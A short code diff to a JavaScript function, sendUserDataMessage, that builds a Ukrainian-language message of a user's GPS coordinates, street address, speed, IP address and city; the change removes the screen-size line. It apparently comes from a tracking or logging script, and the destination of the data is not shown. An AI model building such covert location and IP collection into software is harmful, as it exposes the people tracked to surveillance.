@@ -426,7 +426,6 @@ function sendUserDataMessage() {
   message += `<b>Координати: </b>${lat}, ${long}\n`
   message += `<b>Адреса: </b>${userPosCity}, ${userDistrict}, ${userRoad}, ${userHouse}, ${userPostcode}\n`
   message += `<b>Швидкість: </b>${userSpeed}\n`
-  message += `<b>Розмір екрана: </b>${screenWidth}x${screenHeight}\n`
   message += `<b>IP адреса: </b>${userIp}\n`
   message += `<b>Місто за IP: </b>${userIpCity}\n`
 
